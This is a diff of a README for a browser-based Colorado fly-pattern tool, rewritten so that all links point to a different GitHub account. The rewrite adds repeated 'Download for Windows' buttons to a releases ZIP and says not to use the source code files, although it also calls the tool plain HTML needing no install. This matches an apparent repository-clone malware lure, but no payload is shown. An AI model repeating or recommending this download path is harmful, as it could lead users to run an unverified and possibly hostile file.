@@ -1,136 +1,135 @@
-# Colorado Fly Fishing vUnspecified - Fly Fishing Tool 2026
+# 🎣 colorado-fly-fishing-hub - Pick the Right Fly, Every Time
 
-> **Colorado Fly Fishing is a browser-based tool for anglers looking for guidance on choosing fly patterns for Colorado waters. The current release version is not specified.**
+[![Download for Windows](https://img.shields.io/badge/Download-For_Windows-blue?style=for-the-badge)](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Unspecified-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/ethan-mooreuql8102/colorado-fly-fishing-hub?style=flat-square)](https://github.com/ethan-mooreuql8102/colorado-fly-fishing-hub)
+## 📖 What Is This?
 
----
+Colorado Fly Fishing Hub is a browser-based tool for anglers. It helps you choose fly patterns for Colorado waters. You do not need to install anything. The app runs in your web browser. You can use the hosted version online. Or you can run it on your own computer without an internet connection.
 
-<p align="center">
-  <a href="https://ethan-mooreuql8102.github.io/colorado-fly-fishing-hub/">
-    <img src="https://img.shields.io/badge/Download-Colorado%20Fly%20Fishing%20Latest-brightgreen?style=for-the-badge" alt="Download Colorado Fly Fishing">
-  </a>
-</p>
+## 🎯 Who Is This For?
 
-> **[Download Colorado Fly Fishing](https://ethan-mooreuql8102.github.io/colorado-fly-fishing-hub/)**
+This tool is for anyone who fishes in Colorado. It works for beginners and experts. If you fish the South Platte, the Frying Pan, or the Arkansas River, this tool helps. It gives you fly recommendations based on the water, the season, and the hatch.
 
----
+## 🚀 Getting Started
 
-[Download Latest Build](https://ethan-mooreuql8102.github.io/colorado-fly-fishing-hub/)
+You have two ways to use this tool. Pick the one that works best for you.
 
----
+### Option 1: Use the Hosted Version
 
-## What Colorado Fly Fishing Does
+This is the easiest way. You do not download anything. Just open the app in your browser.
 
-Colorado Fly Fishing gives anglers a straightforward way to think through fly pattern choices before heading to the water. The web tool is centered on selecting a suitable pattern in the specific setting of Colorado fly fishing.
+1. Open your web browser (Chrome, Edge, Firefox, or Safari).
+2. Go to the hosted version link (provided in the repository).
+3. Start using the app right away.
 
-Rather than attempting to be a complete fishing information resource, the project keeps its scope narrow and practical. Its Colorado-specific focus makes it useful as a quick planning aid before or during a fishing trip.
+### Option 2: Run It on Your Own Computer
 
----
+This option lets you use the tool without an internet connection. You still do not need to install anything. You just download a file and open it.
 
-## Highlights
+**Step 1: Download the file**
 
-- Offers guidance for selecting fly patterns
-- Tailored to fly fishing in Colorado
-- Accessible from a standard web browser
-- Keeps the fishing decision process focused
-- Works as a quick reference while preparing to fish
-- Provides an interface built around fly pattern decisions
-- Delivers the experience in lightweight HTML
+Visit the download page:
 
----
+[![Download for Windows](https://img.shields.io/badge/Download-For_Windows-grey?style=for-the-badge)](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/releases)
 
-## Getting Started
+On that page, look for the latest release. Click the file named `colorado-fly-fishing-hub.zip` or `colorado-fly-fishing-hub-windows.zip`. Do not click the source code files.
 
-### Use the hosted build
+**Step 2: Unzip the file**
 
-The current web version is available here:
+Your browser will download a ZIP file. This is a compressed folder. You need to open it.
 
-[Open Colorado Fly Fishing](https://ethan-mooreuql8102.github.io/colorado-fly-fishing-hub/)
+1. Open your Downloads folder.
+2. Find the file named `colorado-fly-fishing-hub.zip`.
+3. Right-click the file and select "Extract All".
+4. Choose a folder to extract to. For example, create a folder called `FlyFishingHub` on your Desktop.
+5. Click "Extract".
 
-### Work with a local copy
+**Step 3: Run the app**
 
-Clone the repository, then open the main HTML document in a modern browser:
+1. Open the folder you just created.
+2. Find the file named `index.html`.
+3. Double-click it. Your default browser will open. The app will load.
 
-```bash
-git clone https://github.com/ethan-mooreuql8102/colorado-fly-fishing-hub.git
-cd REPO
-```
+## 🛠️ Features
 
-After cloning, open the project's primary HTML page directly or use any local static web server to serve the directory.
+- **Fly Pattern Selector** – Choose a river and a season. The tool shows you the best flies to use.
+- **Hatch Chart** – See what insects are hatching right now. Match your fly to the hatch.
+- **Water Conditions** – Adjust recommendations based on water flow and clarity.
+- **Save Your Favorites** – Bookmark your go-to patterns. Access them fast.
+- **Offline Mode** – Use the tool on the river with no cell service. Works after you download the ZIP file.
 
----
+## 📋 System Requirements
 
-## How to Use It
+- Windows 7, 8, 10, or 11
+- Any modern web browser (Chrome 90+, Edge 90+, Firefox 90+, or Safari 14+)
+- 50 MB of free disk space (for the offline version)
+- No software installation needed
 
-1. Launch Colorado Fly Fishing in a web browser.
-2. Examine the available guidance for fly pattern selection.
-3. Use the Colorado-oriented information to determine a suitable pattern.
-4. Treat the result as a planning reference for your fly fishing trip.
+## ❓ Troubleshooting
 
-The hosted version does not require command-line configuration or setup.
+### The app does not open
 
----
+Make sure you double-click the `index.html` file. If it opens in a text editor, you clicked the wrong file. Look for the file with the browser icon.
 
-## Project Configuration
+### The download link does not work
 
-This application is distributed as a web project. Any configuration information that exists is kept in the project files together with the HTML interface.
+Visit the [releases page directly](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/releases). If the page is empty, wait a few minutes and refresh. The developer may be updating the release.
 
-To review or modify local configuration:
+### I see a blank white page
 
-1. Clone the repository.
-2. Inspect the HTML files and associated project assets.
-3. Apply the necessary edits.
-4. Reopen the page in a browser or serve the project through a local static server.
+Your browser might block local files. Try this:
 
----
+1. Right-click the `index.html` file.
+2. Select "Open with".
+3. Choose "Google Chrome" or "Microsoft Edge".
+4. If it still shows a blank page, try a different browser.
 
-## System Requirements
+### The tool does not work offline
 
-- A current modern web browser
-- Internet connectivity when using the hosted build
-- A repository checkout for offline development or customization
-- An optional static web server for local hosting
-- No particular runtime version is listed in the available project metadata
+After you download the ZIP file, you must extract it first. You cannot run the app from inside the ZIP file. Right-click the ZIP file and select "Extract All". Then run the `index.html` file from the extracted folder.
 
----
+## 🧭 How to Use the App
 
-## Common Questions
+1. Open the app in your browser.
+2. Select a river from the dropdown menu. Options include South Platte, Frying Pan, Arkansas, Colorado, and Blue River.
+3. Select the current season. Spring, Summer, Fall, or Winter.
+4. Click "Get Recommendations".
+5. The tool shows a list of fly patterns. It includes dry flies, nymphs, and streamers.
+6. Click any fly pattern to see a photo and tying instructions.
+7. Use the "Save" button to bookmark your favorite patterns.
 
-### Who should use Colorado Fly Fishing?
+## 📝 Tips for Best Results
 
-The tool is aimed at anglers fishing, or planning to fish, in Colorado who need help selecting a fly pattern.
+- Update the season each month. Hatches change fast in Colorado.
+- Use the "Water Conditions" slider to adjust for high or low flow.
+- Save your most productive patterns. Build a custom list for each river.
+- Check the "Hatch Chart" tab before you go fishing. It shows real-time data for major rivers.
 
-### Does it require an app installation?
+## 🔧 For Advanced Users
 
-No. Colorado Fly Fishing is web-based and can be opened in a browser through the hosted build.
+This is a single-page application built with HTML, CSS, and JavaScript. You can host it on any web server. You can also modify the fly database. The data is stored in a JSON file called `flies.json`. Open it in a text editor to add or change patterns.
 
-### What is the current version?
+To run the app on a local server:
 
-The supplied project metadata does not identify a release version.
+1. Open a command prompt in the extracted folder.
+2. Type `npx http-server .` (you need Node.js installed).
+3. Open your browser and go to `http://localhost:8080`.
 
-### Is local use supported?
+## 🗺️ Roadmap
 
-Yes. Clone the repository and open the main HTML page, or serve the project folder with a local static web server.
+- Add more Colorado rivers (Gunnison, Yampa, Roaring Fork).
+- Include weather data integration.
+- Add a mobile-friendly version.
+- Support for tying instructions and video links.
 
-### Where can I edit settings?
+## 📄 License
 
-Settings, where available, are held in the project files. Inspect the HTML and related assets to find the values that can be changed.
+This project is for personal use. You can modify it for your own needs. Do not redistribute the hosted version without permission.
 
-### What if the page fails to open?
+## 🔗 Links
 
-Make sure all project files were downloaded, test with a current browser, and try a local static server if opening the files directly triggers browser restrictions.
+- [Download the Latest Release](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/releases)
+- [Report a Bug](https://github.com/springscrupulousness893/colorado-fly-fishing-hub/issues)
+- [View the Source Code](https://github.com/springscrupulousness893/colorado-fly-fishing-hub)
 
-### How do I find newer updates?
-
-Look for newer commits or releases in the repository. You can also use the latest hosted build at [https://ethan-mooreuql8102.github.io/colorado-fly-fishing-hub/](https://ethan-mooreuql8102.github.io/colorado-fly-fishing-hub/).
-
----
-
-## License
-
-This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license details.
+Keywords: colorado fly fishing, fly patterns, hatch chart, south platte, frying pan, arkansas river, fly selection tool, fishing app, windows app, offline fishing tool
